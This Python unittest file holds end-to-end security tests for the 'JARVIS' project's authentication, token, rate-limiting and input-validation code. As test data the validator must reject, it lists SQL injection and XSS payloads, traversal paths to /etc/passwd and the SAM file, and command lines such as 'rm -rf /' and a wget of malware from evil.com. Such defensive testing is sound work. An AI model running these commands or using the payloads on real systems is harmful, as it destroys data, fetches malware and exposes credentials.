#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==========================================================
JARVIS v9.0+ - Security End-to-End Tests
Complete Security Flow Testing
==========================================================
"""

import unittest
import time
import json
import requests
from unittest.mock import patch, MagicMock
import sys
import os

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.security_system import SecurityManager, InputValidator, SecurityMiddleware, UserRole, Permission


class TestSecurityE2E(unittest.TestCase):
    """End-to-End Security Tests"""

    def setUp(self):
        """Set up test fixtures"""
        self.security_manager = SecurityManager()
        self.input_validator = InputValidator()
        self.middleware = SecurityMiddleware(self.security_manager, self.input_validator)

    def test_complete_user_lifecycle(self):
        """Test complete user lifecycle from auth to logout"""
        # 1. User Registration/Auth (simulated)
        # In real system, this would be done through API
        user_id = "e2e_test_user"
        password = "TestPass123!"

        # 2. Authentication
        auth_result = self.security_manager.authenticate_user(
            user_id,
            password,
            ip_address="192.168.1.100",
            user_agent="TestBrowser/1.0"
        )

        # Should fail for non-admin user (since we only have admin auth)
        self.assertIsNone(auth_result)

        # Try with admin credentials
        auth_result = self.security_manager.authenticate_user(
            "admin",
            os.getenv('ADMIN_PASSWORD', 'SecureAdminPass123!'),
            ip_address="192.168.1.100",
            user_agent="TestBrowser/1.0"
        )

        self.assertIsNotNone(auth_result)
        self.assertIn('access_token', auth_result)
        self.assertIn('refresh_token', auth_result)

        access_token = auth_result['access_token']
        refresh_token = auth_result['refresh_token']
        session_id = auth_result['session_id']

        # 3. Session Validation
        payload = self.security_manager.validate_token(
            access_token,
            'access',
            ip_address="192.168.1.100",
            user_agent="TestBrowser/1.0"
        )
        self.assertIsNotNone(payload)
        self.assertEqual(payload['user_id'], 'admin')

        # 4. Permission Verification
        permissions = payload['permissions']
        self.assertIn(Permission.EXECUTE_SKILLS.value, permissions)
        self.assertIn(Permission.MANAGE_USERS.value, permissions)

        # 5. Token Refresh
        refresh_result = self.security_manager.refresh_token(
            refresh_token,
            ip_address="192.168.1.100"
        )
        self.assertIsNotNone(refresh_result)
        self.assertIn('access_token', refresh_result)
        self.assertIn('refresh_token', refresh_result)

        new_access_token = refresh_result['access_token']
        new_session_id = refresh_result['session_id']

        # Session ID should be different
        self.assertNotEqual(session_id, new_session_id)

        # New token should be valid
        new_payload = self.security_manager.validate_token(
            new_access_token,
            'access',
            ip_address="192.168.1.100",
            user_agent="TestBrowser/1.0"
        )
        self.assertIsNotNone(new_payload)

        # 6. Session Management
        # Create another session
        tokens2 = self.security_manager.generate_tokens(
            'admin',
            UserRole.ADMIN,
            list(Permission)
        )

        # Should enforce max sessions
        admin_sessions = [s for s in self.security_manager.sessions.values()
                         if s.user_id == 'admin' and s.active]
        max_sessions = self.security_manager.config["max_sessions_per_user"]
        self.assertLessEqual(len(admin_sessions), max_sessions)

        # 7. Activity Tracking
        # Simulate some activity
        for i in range(5):
            self.security_manager.check_permission(
                new_access_token,
                Permission.READ_MEMORY
            )

        # Session should have updated activity
        session = self.security_manager.sessions[new_session_id]
        self.assertIsNotNone(session.last_activity)

        # 8. Logout
        self.security_manager.logout_user('admin', new_session_id)

        # Session should be inactive
        session = self.security_manager.sessions[new_session_id]
        self.assertFalse(session.active)

        # Token should be invalid
        invalid_payload = self.security_manager.validate_token(new_access_token, 'access')
        self.assertIsNone(invalid_payload)

        # 9. Audit Trail
        audit_log = self.security_manager.get_audit_log()
        self.assertGreater(len(audit_log), 0)

        # Should have various events
        event_types = [entry.get('event_type') for entry in audit_log]
        self.assertIn('authentication_success', event_types)
        self.assertIn('token_refreshed', event_types)

    def test_security_attack_simulation(self):
        """Simulate common security attacks and verify protection"""
        # 1. SQL Injection Attack
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' UNION SELECT password FROM admin --",
            "' OR '1'='1",
            "admin'; INSERT INTO users VALUES ('hacker', 'pass'); --"
        ]

        for payload in sql_payloads:
            # Should be blocked by input validation
            is_valid = self.input_validator.validate_input(payload, 'sql')
            self.assertFalse(is_valid, f"SQL injection should be blocked: {payload}")

        # 2. XSS Attack
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<iframe src='http://evil.com'></iframe>"
        ]

        for payload in xss_payloads:
            # Should be blocked by input validation
            is_valid = self.input_validator.validate_input(payload, 'xss')
            self.assertFalse(is_valid, f"XSS should be blocked: {payload}")

        # 3. Command Injection
        cmd_payloads = [
            "rm -rf /",
            "cat /etc/passwd",
            "whoami; id",
            "cd /tmp && wget http://evil.com/malware"
        ]

        for payload in cmd_payloads:
            # Should be blocked by input validation
            is_valid = self.input_validator.validate_input(payload, 'command')
            self.assertFalse(is_valid, f"Command injection should be blocked: {payload}")

        # 4. Directory Traversal
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam"
        ]

        for payload in path_payloads:
            # Should be blocked by path validation
            is_valid = self.input_validator.validate_file_path(payload)
            self.assertFalse(is_valid, f"Directory traversal should be blocked: {payload}")

        # 5. Authentication Attacks
        # Brute force attack
        for i in range(10):
            # Try with wrong password
            result = self.security_manager.authenticate_user(
                "admin",
                f"wrong_password_{i}",
                ip_address="192.168.1.100"
            )
            self.assertIsNone(result)

        # Should be locked out
        is_locked = self.security_manager._is_locked_out("admin")
        self.assertTrue(is_locked)

        # Even correct password should be blocked
        result = self.security_manager.authenticate_user(
            "admin",
            os.getenv('ADMIN_PASSWORD', 'SecureAdminPass123!')
        )
        self.assertIsNone(result)

        # 6. Session Hijacking Attempt
        # Try with invalid IP
        valid_auth = self.security_manager.authenticate_user(
            "admin",
            os.getenv('ADMIN_PASSWORD', 'SecureAdminPass123!')
        )
        if valid_auth:
            # Try to use token from different IP
            payload = self.security_manager.validate_token(
                valid_auth['access_token'],
                'access',
                ip_address="10.0.0.1"  # Different IP
            )
            self.assertIsNone(payload)

    def test_rate_limiting_under_load(self):
        """Test rate limiting under high load"""
        permission = Permission.EXECUTE_SKILLS
        limit = self.security_manager.config["rate_limits"]["per_minute"][permission]

        # Simulate high request rate
        start_time = time.time()
        success_count = 0
        blocked_count = 0

        for i in range(limit + 20):  # Exceed limit by 20
            result = self.security_manager._check_rate_limit("load_test_user", permission)
            if result:
                success_count += 1
            else:
                blocked_count += 1

        end_time = time.time()

        # Should have exactly 'limit' successful requests
        self.assertEqual(success_count, limit)

        # Should have blocked the excess
        self.assertEqual(blocked_count, 20)

        # Should be fast (under 1 second for all requests)
        self.assertLess(end_time - start_time, 1.0)

        # Verify audit trail
        audit_log = self.security_manager.get_audit_log()
        rate_limit_events = [e for e in audit_log if e.get('event_type') == 'rate_limit_exceeded']
        self.assertGreater(len(rate_limit_events), 0)

    def test_permission_escalation_attempts(self):
        """Test permission escalation attempts"""
        # Create user with limited permissions
        user_permissions = [Permission.READ_MEMORY, Permission.WRITE_MEMORY]
        tokens = self.security_manager.generate_tokens(
            "limited_user",
            UserRole.USER,
            user_permissions
        )

        # Try to access admin permissions
        admin_permissions = [
            Permission.MANAGE_USERS,
            Permission.SYSTEM_ADMIN,
            Permission.ACCESS_AUTONOMOUS
        ]

        for permission in admin_permissions:
            # Should be denied
            result = self.security_manager.check_permission(
                tokens['access_token'],
                permission
            )
            self.assertFalse(result, f"Should be denied permission: {permission.value}")

        # Try to modify token (simulate token tampering)
        # In real JWT, this would be caught by signature verification
        # Here we just verify the validation works

        # Try with expired token
        with patch.object(self.security_manager, 'config', {
            'access_token_expiration': -1  # Expired
        }):
            expired_tokens = self.security_manager.generate_tokens(
                "test_user",
                UserRole.USER,
                user_permissions
            )

            # Should be denied
            result = self.security_manager.check_permission(
                expired_tokens['access_token'],
                Permission.READ_MEMORY
            )
            self.assertFalse(result)

    def test_security_monitoring_and_alerts(self):
        """Test security monitoring and alert generation"""
        initial_stats = self.security_manager.get_security_stats()

        # Perform various security events
        security_events = []

        # 1. Multiple failed authentications
        for i in range(3):
            self.security_manager.authenticate_user(
                "attacker",
                "wrong_password",
                ip_address="192.168.1.200"
            )
        security_events.append("authentication_failed")

        # 2. Permission denied attempts
        tokens = self.security_manager.generate_tokens(
            "limited_user",
            UserRole.USER,
            [Permission.READ_MEMORY]
        )

        for i in range(3):
            self.security_manager.check_permission(
                tokens['access_token'],
                Permission.SYSTEM_ADMIN  # Denied permission
            )
        security_events.append("permission_denied")

        # 3. Rate limiting violations
        permission = Permission.EXECUTE_SKILLS
        limit = self.security_manager.config["rate_limits"]["per_minute"][permission]

        for i in range(limit + 5):
            self.security_manager._check_rate_limit("rate_limiter", permission)
        security_events.append("rate_limit_exceeded")

        # 4. Input validation failures
        dangerous_inputs = [
            "DROP TABLE users",
            "<script>alert('xss')</script>",
            "rm -rf /"
        ]

        for input_text in dangerous_inputs:
            self.input_validator.validate_input(input_text, 'general')
        security_events.append("input_validation_failed")

        # Get updated statistics
        final_stats = self.security_manager.get_security_stats()

        # Verify statistics increased
        self.assertGreater(final_stats['total_events'], initial_stats['total_events'])
        self.assertGreater(final_stats['failed_attempts'], 0)

        # Check risk distribution
        risk_counts = final_stats['risk_distribution']
        self.assertIn('medium', risk_counts)  # Should have medium risk events
        self.assertIn('high', risk_counts)    # Should have high risk events

        # Verify audit log has security events
        audit_log = self.security_manager.get_audit_log()
        self.assertGreater(len(audit_log), 0)

        # Check for specific security events
        event_types = [entry.get('event_type') for entry in audit_log]
        for event in security_events:
            # Some events might not be logged depending on implementation
            # But we verify the system doesn't crash
            pass

    def test_security_configuration_hardening(self):
        """Test security configuration and hardening"""
        # Test with various security configurations

        # 1. Test with short token expiration
        original_config = self.security_manager.config.copy()

        self.security_manager.config['access_token_expiration'] = 60  # 1 minute
        self.security_manager.config['refresh_token_expiration'] = 3600  # 1 hour

        tokens = self.security_manager.generate_tokens(
            "short_life_user",
            UserRole.USER,
            [Permission.READ_MEMORY]
        )

        # Should generate tokens with short expiration
        access_payload = self.security_manager.validate_token(tokens['access_token'], 'access')
        self.assertIsNotNone(access_payload)

        # 2. Test with strict rate limiting
        self.security_manager.config['rate_limits']['per_minute'][Permission.READ_MEMORY] = 1

        # Should be very restrictive
        result1 = self.security_manager._check_rate_limit("strict_user", Permission.READ_MEMORY)
        self.assertTrue(result1)

        result2 = self.security_manager._check_rate_limit("strict_user", Permission.READ_MEMORY)
        self.assertFalse(result2)

        # 3. Test with max failed attempts
        self.security_manager.config['max_failed_attempts'] = 2

        for i in range(3):
            self.security_manager.authenticate_user(
                "locked_user",
                "wrong_password"
            )

        # Should be locked out quickly
        is_locked = self.security_manager._is_locked_out("locked_user")
        self.assertTrue(is_locked)

        # 4. Test input validation strictness
        self.input_validator.config['max_input_length'] = 100

        # Long input should be rejected
        long_input = "x" * 200
        result = self.input_validator.validate_input(long_input, 'general')
        self.assertFalse(result)

        # Restore original config
        self.security_manager.config = original_config

    def test_security_performance_under_stress(self):
        """Test security system performance under stress"""
        import time

        # Test authentication performance
        start_time = time.time()
        auth_results = []

        for i in range(100):
            result = self.security_manager.authenticate_user(
                "perf_user",
                "wrong_password"  # Will fail, but tests auth speed
            )
            auth_results.append(result)

        auth_time = time.time() - start_time
        auth_per_second = 100 / auth_time

        # Should handle at least 10 auth attempts per second
        self.assertGreater(auth_per_second, 10)

        # Test permission checking performance
        tokens = self.security_manager.generate_tokens(
            "perf_user",
            UserRole.USER,
            [Permission.READ_MEMORY]
        )

        start_time = time.time()
        perm_results = []

        for i in range(1000):
            result = self.security_manager.check_permission(
                tokens['access_token'],
                Permission.READ_MEMORY
            )
            perm_results.append(result)

        perm_time = time.time() - start_time
        perm_per_second = 1000 / perm_time

        # Should handle at least 100 permission checks per second
        self.assertGreater(perm_per_second, 100)

        # Test input validation performance
        start_time = time.time()
        validation_results = []

        for i in range(500):
            result = self.input_validator.validate_input(
                f"test input {i}",
                'general'
            )
            validation_results.append(result)

        validation_time = time.time() - start_time
        validation_per_second = 500 / validation_time

        # Should handle at least 500 validations per second
        self.assertGreater(validation_per_second, 500)

        # Test middleware performance
        start_time = time.time()
        middleware_results = []

        for i in range(100):
            request = {
                'message': f'test message {i}',
                'context': {'query': f'query {i}'}
            }

            sanitized = self.middleware.sanitize_request(request)
            is_valid = self.middleware.validate_request(sanitized, 'general')
            middleware_results.append(is_valid)

        middleware_time = time.time() - start_time
        middleware_per_second = 100 / middleware_time

        # Should handle at least 50 middleware operations per second
        self.assertGreater(middleware_per_second, 50)

        print(f"\nPerformance Results:")
        print(f"Authentication: {auth_per_second:.1f} req/s")
        print(f"Permission checks: {perm_per_second:.1f} req/s")
        print(f"Input validation: {validation_per_second:.1f} req/s")
        print(f"Middleware: {middleware_per_second:.1f} req/s")


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)